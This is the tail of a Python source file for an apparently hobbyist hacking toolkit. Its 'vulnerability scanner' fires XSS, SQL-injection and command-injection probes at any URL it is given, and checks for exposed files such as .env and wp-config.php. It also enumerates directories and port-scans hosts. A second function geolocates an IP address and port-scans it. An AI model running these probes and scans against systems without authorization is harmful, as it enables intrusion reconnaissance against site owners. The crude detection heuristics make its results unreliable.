                print(f"  {RED}{i}. {issue}{RESET}")
        
        print()
        
    except Exception as e:
        print(f"{RED}Scan error: {e}{RESET}")

def vulnerability_scanner_tool():
    import dns.resolver
    import dns.reversename
    import whois
    import re
    
    clear()
    tiger_ascii_art()
    print(f"{BOLD}{CYAN}== ADVANCED VULNERABILITY & THREAT SCANNER == note: this tools is still in development, expect bugs and incomplete features.{RESET}")
    print(f"{CYAN}▶ Enter website URL: {RESET}", end='', flush=True)
    url = input().strip()
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    parsed = urlparse(url)
    domain = parsed.netloc.replace('www.', '')
    
    print(f"\n{BOLD}{CYAN}╔════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{CYAN}║       COMPREHENSIVE VULNERABILITY ASSESSMENT      ║{RESET}")
    print(f"{BOLD}{CYAN}╚════════════════════════════════════════════════════╝{RESET}\n")
    
    vulns = []
    warnings = []
    info = []
    ips = []
    
    # 1. DOMAIN & WHOIS INTELLIGENCE
    print(f"{BOLD}{YELLOW}[1/14] Domain Intelligence & WHOIS Lookup...{RESET}")
    try:
        w = whois.whois(domain)
        print(f"{GREEN}✓{RESET} Registrar: {CYAN}{w.registrar}{RESET}")
        print(f"{GREEN}✓{RESET} Registrant: {CYAN}{str(w.registrant_name)[:80] if w.registrant_name else 'Private/Hidden'}{RESET}")
        if w.creation_date:
            print(f"{GREEN}✓{RESET} Created: {CYAN}{w.creation_date}{RESET}")
        if w.expiration_date:
            print(f"{GREEN}✓{RESET} Expires: {CYAN}{w.expiration_date}{RESET}")
        if w.emails:
            email_str = ', '.join(w.emails[:3])
            vulns.append(f"Admin emails exposed: {email_str}")
            print(f"{RED}⚠{RESET}  Exposed emails: {email_str}")
        if hasattr(w, 'dnssec') and w.dnssec:
            print(f"{GREEN}✓{RESET} DNSSEC enabled")
        else:
            warnings.append("DNSSEC not enabled")
    except Exception as e:
        warnings.append(f"WHOIS lookup failed")
    
    # 2. DNS SECURITY CHECK + IP COLLECTION
    print(f"\n{BOLD}{YELLOW}[2/14] DNS Security Analysis & IP Resolution...{RESET}")
    try:
        for rtype in ['A', 'AAAA']:
            try:
                answers = dns.resolver.resolve(domain, rtype)
                for rdata in answers:
                    ip = str(rdata)
                    ips.append(ip)
                    print(f"{GREEN}✓{RESET} {rtype}: {CYAN}{ip}{RESET}")
                    
                    # Get ASN and hosting info
                    try:
                        asn_resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5).json()
                        print(f"  ├─ ISP: {CYAN}{asn_resp.get('org', 'N/A')}{RESET}")
                        print(f"  ├─ Country: {CYAN}{asn_resp.get('country', 'N/A')}{RESET}")
                        print(f"  └─ Location: {CYAN}{asn_resp.get('city', 'N/A')}{RESET}")
                    except:
                        pass
            except:
                pass
        
        # Check for DNS amplification vulnerability
        try:
            dns.resolver.resolve(domain, 'ANY')
            print(f"{YELLOW}⚠{RESET}  ANY query allowed (DNS amplification risk)")
            vulns.append("DNS ANY query enabled (amplification risk)")
        except:
            print(f"{GREEN}✓{RESET} ANY query blocked")
    except Exception as e:
        warnings.append(f"DNS check failed")
    
    # 3. CERTIFICATE TRANSPARENCY SEARCH
    print(f"\n{BOLD}{YELLOW}[3/14] Certificate Transparency Analysis...{RESET}")
    try:
        crt_url = f"https://crt.sh/?q={domain}&output=json"
        certs = requests.get(crt_url, timeout=5).json()
        if isinstance(certs, list) and len(certs) > 0:
            print(f"{GREEN}✓{RESET} Found {len(certs)} certificate(s)")
            for cert in certs[:3]:
                if 'name_value' in cert:
                    names = cert['name_value'].split('\n')
                    print(f"  ├─ Names: {CYAN}{names[0][:60]}{RESET}")
                info.append(f"Certificate: {cert.get('name_value', 'N/A')[:60]}")
    except:
        pass
    
    # 4. SECURITY HEADERS SCAN
    print(f"\n{BOLD}{YELLOW}[4/14] Security Headers Analysis...{RESET}")
    try:
        resp = requests.get(url, timeout=8, verify=False)
        headers = resp.headers
        
        header_checks = {
            'X-Frame-Options': ('Clickjacking', True),
            'X-Content-Type-Options': ('MIME Sniffing', True),
            'Strict-Transport-Security': ('HSTS/TLS Downgrade', True),
            'Content-Security-Policy': ('XSS/Injection', True),
            'X-XSS-Protection': ('XSS', False),
            'Referrer-Policy': ('Information Leak', False),
            'Permissions-Policy': ('Feature Abuse', False),
            'X-UA-Compatible': ('Browser Compatibility', False)
        }
        
        for header, (risk, critical) in header_checks.items():
            if header in headers:
                print(f"{GREEN}✓{RESET} {header}: {CYAN}{headers[header][:60]}{RESET}")
            else:
                msg = f"Missing {header} ({risk})"
                if critical:
                    vulns.append(msg)
                    print(f"{RED}✗{RESET} {msg}")
                else:
                    warnings.append(msg)
    except Exception as e:
        warnings.append(f"Header check failed")
    
    # 5. XSS & INPUT VALIDATION TESTING
    print(f"\n{BOLD}{YELLOW}[5/14] XSS & Input Validation Testing...{RESET}")
    xss_payloads = [
        '<script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        "<svg onload=alert(1)>",
        "'><img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
    ]
    
    def test_xss(param):
        for payload in xss_payloads:
            try:
                test_url = f"{url.rstrip('/')}?{param}={quote(payload)}"
                r = requests.get(test_url, timeout=2, verify=False)
                # XSS detected if payload is reflected without encoding
                if payload in r.text:
                    return f"XSS in '{param}'"
            except Exception as e:
                pass
        return None
    
    test_params = ['id', 'search', 'q']
    found_xss = False
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = [executor.submit(test_xss, p) for p in test_params]
        for future in futures:
            try:
                result = future.result(timeout=5)
                if result:
                    vulns.append(result)
                    print(f"{RED}⚠{RESET} {result}")
                    found_xss = True
            except:
                pass
    
    if not found_xss:
        print(f"{YELLOW}○{RESET} XSS testing complete (no vulnerabilities found)")
    
    # 6. SQL INJECTION TESTING
    print(f"\n{BOLD}{YELLOW}[6/14] SQL Injection Testing...{RESET}")
    sql_payloads = [
        "' OR '1'='1' --",
        "\" OR \"1\"=\"1\" --",
        "' OR 1=1 #",
        "admin' --",
    ]
    
    def test_sql(param):
        for payload in sql_payloads:
            try:
                test_url = f"{url.rstrip('/')}?{param}={quote(payload)}"
                r = requests.get(test_url, timeout=2, verify=False)
                errors = ['SQL', 'syntax', 'database', 'mysql', 'postgres', 'oracle', 'Query', 'Error']
                if any(err.lower() in r.text.lower() for err in errors):
                    return f"SQL Injection in '{param}'"
            except:
                pass
        return None
    
    sql_params = ['id', 'search', 'query']
    found_sql = False
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = [executor.submit(test_sql, p) for p in sql_params]
        for future in futures:
            try:
                result = future.result(timeout=5)
                if result:
                    vulns.append(result)
                    print(f"{RED}⚠{RESET} {result}")
                    found_sql = True
            except:
                pass
    
    if not found_sql:
        print(f"{YELLOW}○{RESET} SQL injection testing complete (no vulnerabilities found)")
    
    # 7. COMMAND INJECTION & RCE
    print(f"\n{BOLD}{YELLOW}[7/14] Command Injection & RCE Testing...{RESET}")
    rce_payloads = [";ls", "|whoami", "&ipconfig"]
    
    def test_rce(param):
        for payload in rce_payloads:
            try:
                test_url = f"{url.rstrip('/')}?{param}={quote(payload)}"
                r = requests.get(test_url, timeout=2, verify=False)
                if any(kw in r.text for kw in ['root', 'uid=', 'Administrator', 'SYSTEM']):
                    return f"RCE in '{param}'"
            except:
                pass
        return None
    
    rce_params = ['cmd', 'exec', 'command']
    found_rce = False
    with ThreadPoolExecutor(max_workers=3) as executor:
        futures = [executor.submit(test_rce, p) for p in rce_params]
        for future in futures:
            try:
                result = future.result(timeout=5)
                if result:
                    vulns.append(result)
                    print(f"{RED}⚠{RESET} {result}")
                    found_rce = True
            except:
                pass
    
    if not found_rce:
        print(f"{YELLOW}○{RESET} RCE testing complete (no vulnerabilities found)")
    
    # 8. SENSITIVE FILES & PATH TRAVERSAL
    print(f"\n{BOLD}{YELLOW}[8/14] Sensitive Files & Directory Exposure...{RESET}")
    files = ['.env', '.git/config', 'web.config', 'wp-config.php', '.htaccess',
            'config.php', 'robots.txt', 'docker-compose.yml', 'Dockerfile', '.env.production']
    
    def check_file(path):
        try:
            r = requests.head(f"{url.rstrip('/')}/{path}", timeout=1, verify=False, allow_redirects=False)
            if r.status_code in [200, 403]:
                return path
        except:
            pass
        return None
    
    files_found = 0
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_file, f) for f in files]
        for future in futures:
            try:
                result = future.result(timeout=2)
                if result:
                    vulns.append(f"Exposed file: /{result}")
                    print(f"{RED}⚠{RESET} Found: /{result}")
                    files_found += 1
            except:
                pass
    
    if files_found == 0:
        print(f"{YELLOW}○{RESET} No sensitive files found")
    
    # 9. DIRECTORY ENUMERATION
    print(f"\n{BOLD}{YELLOW}[9/14] Directory & Endpoint Enumeration...{RESET}")
    dirs = ['admin', 'api', 'uploads', 'backup', 'test', 'dev', 'staging', 'config', 'docs']
    
    def check_dir(path):
        try:
            r = requests.head(f"{url.rstrip('/')}/{path}/", timeout=1, verify=False, allow_redirects=False)
            if r.status_code in [200, 301, 302, 403]:
                return path
        except:
            pass
        return None
    
    dirs_found = 0
    with ThreadPoolExecutor(max_workers=8) as executor:
        futures = [executor.submit(check_dir, d) for d in dirs]
        for future in futures:
            try:
                result = future.result(timeout=2)
                if result:
                    info.append(f"Directory: /{result}/")
                    print(f"{CYAN}→{RESET} /{result}/")
                    dirs_found += 1
            except:
                pass
    
    if dirs_found == 0:
        print(f"{YELLOW}○{RESET} No accessible directories found")
    
    # 10. CSRF & SESSION MANAGEMENT
    print(f"\n{BOLD}{YELLOW}[10/14] CSRF & Session Management...{RESET}")
    try:
        r = requests.get(url, timeout=8, verify=False)
        
        # CSRF Check
        if 'csrf' not in r.text.lower() and 'token' not in r.text.lower():
            vulns.append("No CSRF token detected")
            print(f"{RED}✗{RESET} No CSRF protection")
        else:
            print(f"{GREEN}✓{RESET} CSRF token found")
        
        # Cookie Security Check
        cookie_header = r.headers.get('Set-Cookie', '')
        if cookie_header:
            if 'samesite' not in cookie_header.lower():
                warnings.append("Missing SameSite cookie attribute")
                print(f"{YELLOW}⚠{RESET}  No SameSite cookie")
            else:
                print(f"{GREEN}✓{RESET} SameSite cookie set")
            
            if 'secure' not in cookie_header.lower():
                vulns.append("Cookie missing Secure flag")
                print(f"{RED}✗{RESET} Cookie missing Secure flag")
            
            if 'httponly' not in cookie_header.lower():
                vulns.append("Cookie missing HttpOnly flag")
                print(f"{RED}✗{RESET} HttpOnly not set")
        else:
            print(f"{YELLOW}○{RESET} No cookies set")
    except:
        pass
    
    # 11. SSL/TLS VULNERABILITIES
    print(f"\n{BOLD}{YELLOW}[11/14] SSL/TLS Analysis...{RESET}")
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                protocol = ssock.version()
                cipher = ssock.cipher()
                
                print(f"{GREEN}✓{RESET} Protocol: {CYAN}{protocol}{RESET}")
                if cipher:
                    print(f"{GREEN}✓{RESET} Cipher: {CYAN}{cipher[0]}{RESET}")
                
                if protocol in ['SSLv2', 'SSLv3', 'TLSv1.0', 'TLSv1.1']:
                    vulns.append(f"Insecure protocol: {protocol}")
                    print(f"{RED}⚠{RESET}  Weak protocol version")
                
                # Check certificate expiration
                import datetime
                try:
                    exp_date = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    days_left = (exp_date - datetime.datetime.utcnow()).days
                    
                    if days_left < 30:
                        warnings.append(f"Certificate expires in {days_left} days")
                        print(f"{YELLOW}⚠{RESET}  Certificate expires soon")
                    else:
                        print(f"{GREEN}✓{RESET} Certificate valid for {days_left} days")
                except:
                    pass
    except Exception as e:
        warnings.append(f"SSL check failed")
    
    # 12. SERVICE PORT SCANNING
    print(f"\n{BOLD}{YELLOW}[12/14] Dangerous Port Scanning...{RESET}")
    dangerous_ports = {
        23: 'TELNET', 443: 'HTTPS', 80: 'HTTP',
        3306: 'MySQL', 5432: 'PostgreSQL', 27017: 'MongoDB',
        6379: 'Redis', 445: 'SMB'
    }
    
    def scan_port(host, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((host, port))
            sock.close()
            if result == 0:
                return port
        except:
            pass
        return None
    
    ports_open = []
    try:
        if ips:
            print(f"{CYAN}Scanning {ips[0]}...{RESET}")
            with ThreadPoolExecutor(max_workers=12) as executor:
                futures = [executor.submit(scan_port, ips[0], p) for p in dangerous_ports.keys()]
                for future in futures:
                    try:
                        port = future.result(timeout=3)
                        if port:
                            service = dangerous_ports.get(port)
                            ports_open.append(port)
                            info.append(f"Port {port} ({service}) OPEN")
                            print(f"{RED}⚠{RESET} Port {CYAN}{port} ({service}){RESET} OPEN!")
                    except:
                        pass
    except:
        pass
    
    if not ports_open:
        print(f"{YELLOW}○{RESET} Port scan complete (no dangerous ports open)")
    
    # 13. INFORMATION DISCLOSURE
    print(f"\n{BOLD}{YELLOW}[13/14] Information Disclosure & Metadata...{RESET}")
    try:
        resp = requests.get(url, timeout=8, verify=False)
        
        # Check for error pages disclosing info
        if 'error' in resp.text.lower() or 'exception' in resp.text.lower():
            vulns.append("Verbose error messages (information disclosure)")
            print(f"{RED}⚠{RESET} Verbose errors detected")
        
        # Check for server info leakage
        server = resp.headers.get('Server', '').lower()
        if server and server != 'hidden':
            info.append(f"Server: {server}")
            print(f"{CYAN}→{RESET} Server: {resp.headers.get('Server')}")
        
        # Look for comments with sensitive info
        comments = re.findall(r'<!--(.*?)-->', resp.text, re.DOTALL)
        if comments:
            for comment in comments[:3]:
                if any(kw in comment.lower() for kw in ['password', 'api', 'key', 'secret', 'token', 'auth']):
                    vulns.append(f"Sensitive data in HTML comments")
                    print(f"{RED}⚠{RESET} Sensitive comment found")
                    break
    except:
        pass
    
    # 14. FINAL COMPREHENSIVE REPORT
    print(f"\n{BOLD}{CYAN}╔════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{CYAN}║         COMPREHENSIVE VULNERABILITY REPORT         ║{RESET}")
    print(f"{BOLD}{CYAN}╚════════════════════════════════════════════════════╝{RESET}\n")
    
    print(f"{BOLD}URL:{RESET} {CYAN}{url}{RESET}")
    print(f"{BOLD}Domain:{RESET} {CYAN}{domain}{RESET}")
    print(f"{BOLD}IP(s):{RESET} {CYAN}{', '.join(ips) if ips else 'None'}{RESET}\n")
    
    # Vulnerabilities
    if vulns:
        print(f"{RED}⚠ CRITICAL VULNERABILITIES ({len(vulns)}):{RESET}")
        for i, v in enumerate(vulns[:30], 1):
            print(f"  {RED}{i}. {v}{RESET}")
    else:
        print(f"{GREEN}✓ No critical vulnerabilities found{RESET}")
    
    # Warnings
    if warnings:
        print(f"\n{YELLOW}⚡ WARNINGS ({len(warnings)}):{RESET}")
        for i, w in enumerate(warnings[:20], 1):
            print(f"  {YELLOW}{i}. {w}{RESET}")
    
    # Info
    if info:
        print(f"\n{CYAN}ℹ INFORMATION ({len(info)}):{RESET}")
        for i, inf in enumerate(info[:15], 1):
            print(f"  {CYAN}{i}. {inf}{RESET}")
    
    # Risk Assessment
    risk_level = "CRITICAL" if len(vulns) >= 8 else "HIGH" if len(vulns) >= 5 else "MEDIUM" if len(vulns) >= 2 else "LOW" if vulns else "SAFE"
    color = RED if len(vulns) >= 8 else RED if len(vulns) >= 5 else YELLOW if len(vulns) >= 2 else GREEN
    print(f"\n{color}{BOLD}OVERALL RISK LEVEL: {risk_level}{RESET}")
    print(f"{CYAN}Total Issues: {len(vulns) + len(warnings) + len(info)}{RESET}\n")

def ip_info_tool():
    clear()
    tiger_ascii_art()
    print(f"{BOLD}{CYAN}== Advanced IP Geolocation & Threat Intelligence =={RESET}")
    ip = input(f"{CYAN}Enter the public IP address: {RESET}").strip()
    
    import ipaddress
    
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        print(f"{RED}Invalid IP address format{RESET}")
        return
    
    print(f"\n{BOLD}{YELLOW}[*] Gathering information from multiple sources...{RESET}\n")
    
    print(f"{BOLD}{YELLOW}[*] Primary Geolocation:{RESET}")
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query", timeout=5)
        data = response.json()
        
        if data.get('status') == 'success':
            print(f"{GREEN}✓ {RESET}IP: {CYAN}{data.get('query')}{RESET}")
            print(f"{GREEN}✓ {RESET}Country: {CYAN}{data.get('country')} ({data.get('countryCode')}){RESET}")
            print(f"{GREEN}✓ {RESET}Region: {CYAN}{data.get('regionName')}{RESET}")
            print(f"{GREEN}✓ {RESET}City: {CYAN}{data.get('city')}{RESET}")
            print(f"{GREEN}✓ {RESET}Postal Code: {CYAN}{data.get('zip')}{RESET}")
            print(f"{GREEN}✓ {RESET}Latitude: {CYAN}{data.get('lat')}{RESET}")
            print(f"{GREEN}✓ {RESET}Longitude: {CYAN}{data.get('lon')}{RESET}")
            print(f"{GREEN}✓ {RESET}Timezone: {CYAN}{data.get('timezone')}{RESET}")
        else:
            print(f"{RED}✗ {RESET}Lookup failed: {data.get('message')}")
    except Exception as e:
        print(f"{RED}✗ {RESET}Error: {e}")
    
    print(f"\n{BOLD}{YELLOW}[*] ISP & Network Information:{RESET}")
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,isp,org,as,asname,reverse,mobile,proxy,hosting", timeout=5)
        data = response.json()
        
        if data.get('status') == 'success':
            print(f"{GREEN}✓ {RESET}ISP: {CYAN}{data.get('isp')}{RESET}")
            print(f"{GREEN}✓ {RESET}Organization: {CYAN}{data.get('org')}{RESET}")
            print(f"{GREEN}✓ {RESET}ASN: {CYAN}{data.get('as')}{RESET}")
            print(f"{GREEN}✓ {RESET}AS Name: {CYAN}{data.get('asname')}{RESET}")
            
            reverse = data.get('reverse', 'N/A')
            if reverse and reverse != 'N/A':
                print(f"{GREEN}✓ {RESET}Reverse DNS: {CYAN}{reverse}{RESET}")
            
            print(f"{GREEN}✓ {RESET}Mobile: {CYAN}{'Yes' if data.get('mobile') else 'No'}{RESET}")
            print(f"{GREEN}✓ {RESET}VPN/Proxy: {CYAN}{'Yes - DETECTED' if data.get('proxy') else 'No'}{RESET}")
            print(f"{GREEN}✓ {RESET}Hosting/Datacenter: {CYAN}{'Yes - DETECTED' if data.get('hosting') else 'No'}{RESET}")
    except Exception as e:
        print(f"{RED}✗ {RESET}Error: {e}")
    
    print(f"\n{BOLD}{YELLOW}[*] Threat Intelligence:{RESET}")
    try:
        response2 = requests.get(f"https://ipqualityscore.com/api/json/ip/{ip}", params={'strictness': 0}, timeout=5)
        if response2.status_code == 200:
            threat_data = response2.json()
            print(f"{GREEN}✓ {RESET}Threat Level: {CYAN}{threat_data.get('threat_level', 'Unknown')}{RESET}")
            print(f"{GREEN}✓ {RESET}Fraud Score: {CYAN}{threat_data.get('fraud_score', 'N/A')}%{RESET}")
            print(f"{GREEN}✓ {RESET}Is Bot: {CYAN}{'Yes' if threat_data.get('is_bot') else 'No'}{RESET}")
            print(f"{GREEN}✓ {RESET}Is Crawler: {CYAN}{'Yes' if threat_data.get('is_crawler') else 'No'}{RESET}")
    except:
        print(f"{YELLOW}○ {RESET}Threat database check unavailable")
    
    print(f"\n{BOLD}{YELLOW}[*] Network Classification:{RESET}")
    try:
        ip_obj = ipaddress.ip_address(ip)
        if ip_obj.is_private:
            print(f"{YELLOW}⚠ {RESET}This is a {CYAN}Private IP Address{RESET} (RFC1918)")
        elif ip_obj.is_loopback:
            print(f"{YELLOW}⚠ {RESET}This is a {CYAN}Loopback Address{RESET}")
        elif ip_obj.is_multicast:
            print(f"{YELLOW}⚠ {RESET}This is a {CYAN}Multicast Address{RESET}")
        else:
            print(f"{GREEN}✓ {RESET}This is a {CYAN}Public IP Address{RESET}")
    except:
        pass
    
    print(f"\n{BOLD}{YELLOW}[*] Port Scanning (Top 30 Common Ports):{RESET}")
    open_ports = []
    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 465, 587, 993, 995, 1433, 3306, 3389, 5432, 5900, 8080, 8443, 8888, 9200, 27017, 50000, 3000, 5000, 6379, 9000, 9999]
    
    for port in common_ports[:20]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.8)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
                print(f"{RED}◆ {RESET}Port {CYAN}{port:5}{RESET} {RED}OPEN{RESET}")
            sock.close()
        except:
            pass
    
    if not open_ports:
        print(f"{YELLOW}○ {RESET}No open ports detected")
    else:
        print(f"{BOLD}{RED}⚠ {len(open_ports)} OPEN PORT(S)!{RESET}")
    
    print(f"\n{BOLD}{YELLOW}[*] Location Map URL:{RESET}")
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = response.json()
        if data.get('status') == 'success':
            lat = data.get('lat')
            lon = data.get('lon')
            maps_url = f"https://maps.google.com/?q={lat},{lon}"
            print(f"{CYAN}{maps_url}{RESET}")
    except:
        pass

if __name__ == "__main__":
    check_dependencies()
    menu()
